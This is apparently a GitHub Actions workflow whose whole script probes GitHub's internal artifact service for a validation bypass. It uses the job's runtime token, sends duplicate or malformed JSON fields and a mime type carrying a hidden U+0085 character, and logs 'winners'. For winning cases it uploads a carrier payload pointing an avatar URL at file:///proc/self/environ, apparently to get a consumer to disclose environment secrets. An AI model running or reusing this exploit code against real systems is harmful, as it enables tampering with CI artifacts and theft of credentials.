name: race4

on:
  workflow_dispatch:

jobs:
  probe:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const https = require('node:https');
            const crypto = require('node:crypto');

            const endpoint = process.env.ACTIONS_RESULTS_URL || '';
            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
            let runId, jobId;
            for (const s of String(claims.scp || '').split(' ')) {
              if (s.startsWith('Actions.Results:')) { const p = s.split(':'); runId = p[1]; jobId = p[2]; }
            }
            const SVC = endpoint.replace(/\/+$/, '')
              + '/twirp/github.actions.results.api.v1.ArtifactService/';
            const ODD = '\u0085application/json';
            const repo = process.env.GITHUB_REPOSITORY;
            const probe = Buffer.from('{"probe":"validator-bypass"}');
            const digest = 'sha256:' + crypto.createHash('sha256').update(probe).digest('hex');
            const ids = `"workflow_run_backend_id":${JSON.stringify(runId)},`
              + `"workflow_job_run_backend_id":${JSON.stringify(jobId)}`;

            async function post(method, rawBody) {
              try {
                const r = await fetch(SVC + method, { method: 'POST',
                  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
                  body: rawBody });
                const text = await r.text();
                let json = null; try { json = JSON.parse(text); } catch (e) {}
                return { status: r.status, json, text: text.slice(0, 150) };
              } catch (e) { return { status: 0, json: null, text: String(e).slice(0, 150) }; }
            }
            function put(url, body, ct) {
              return new Promise((resolve) => {
                const u = new URL(url);
                const req = https.request({ method: 'PUT', hostname: u.hostname,
                  path: u.pathname + u.search,
                  headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': ct,
                             'x-ms-version': '2021-08-06',
                             'content-length': Buffer.byteLength(body) } },
                  (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
                req.on('error', () => resolve('ERR')); req.end(body);
              });
            }
            const urlOf = (r) => r.json && (r.json.signedUploadUrl || r.json.signed_upload_url);
            const idOf = (r) => r.json && String(r.json.artifactId || r.json.artifact_id || '');
            const q = (s) => JSON.stringify(s);

            // version 7 is the only version whose delivery honours mime_type, and it is the
            // only version that validates it. Everything below tries to make the validator
            // and the field decoder disagree about which value (or which version) applies.
            const cases = [
              ['dup-mime-odd-first',  (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":${q(ODD)},"mime_type":"application/json"}`],
              ['dup-mime-odd-last',   (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":"application/json","mime_type":${q(ODD)}}`],
              ['spelling-snake-odd',  (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":${q(ODD)},"mimeType":"application/json"}`],
              ['spelling-camel-odd',  (n) => `{${ids},"name":${q(n)},"version":7,"mimeType":${q(ODD)},"mime_type":"application/json"}`],
              ['dup-version-6-7',     (n) => `{${ids},"name":${q(n)},"version":6,"mime_type":${q(ODD)},"version":7}`],
              ['dup-version-7-6',     (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":${q(ODD)},"version":6}`],
              ['version-string-7',    (n) => `{${ids},"name":${q(n)},"version":"7","mime_type":${q(ODD)}}`],
              ['version-float-7',     (n) => `{${ids},"name":${q(n)},"version":7.0,"mime_type":${q(ODD)}}`],
              ['version-8',           (n) => `{${ids},"name":${q(n)},"version":8,"mime_type":${q(ODD)}}`],
              ['version-neg',         (n) => `{${ids},"name":${q(n)},"version":-1,"mime_type":${q(ODD)}}`],
              ['mime-escaped',        (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":"\\u0085application/json"}`],
              ['mime-trail-escaped',  (n) => `{${ids},"name":${q(n)},"version":7,"mime_type":"application/json\\u0085"}`],
            ];

            const winners = [];
            for (const [label, build] of cases) {
              const name = `bp-${label}-${Date.now()}`;
              const c = await post('CreateArtifact', build(name));
              if (c.status !== 200) { core.info(`[${label}] create=${c.status} ${c.text}`); continue; }
              const url = urlOf(c);
              const up = await put(url, probe, ODD);
              const f = await post('FinalizeArtifact',
                `{${ids},"name":${q(name)},"size":"${probe.length}","hash":${q(digest)}}`);
              const id = idOf(f);
              const v = await post('GetSignedArtifactURL', `{${ids},"name":${q(name)}}`);
              let rsct = null;
              const su = v.json && (v.json.signedUrl || v.json.signed_url);
              if (su) { try { rsct = new URL(su).searchParams.get('rsct'); } catch (e) {} }
              const odd = typeof rsct === 'string' && rsct.includes('\u0085');
              core.info(`[${label}] create=200 put=${up} fin=${f.status} id=${id} `
                + `rsct=${JSON.stringify(rsct)} ODD=${odd}`);
              if (odd && id) {
                const carrier = Buffer.from(JSON.stringify({
                  full_name: `${repo}/actions/artifacts/${id}/zip`,
                  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
                  description: 'repo cassette carrier', stargazers_count: 0 }));
                await put(url, carrier, ODD);
                winners.push({ label, id, repository: `${repo}/actions/artifacts/${id}/zip`,
                  sha256: crypto.createHash('sha256').update(carrier).digest('hex') });
                core.info('WINNER4 ' + JSON.stringify(winners.at(-1)));
              }
            }
            core.info('WINNERS4 ' + JSON.stringify(winners));
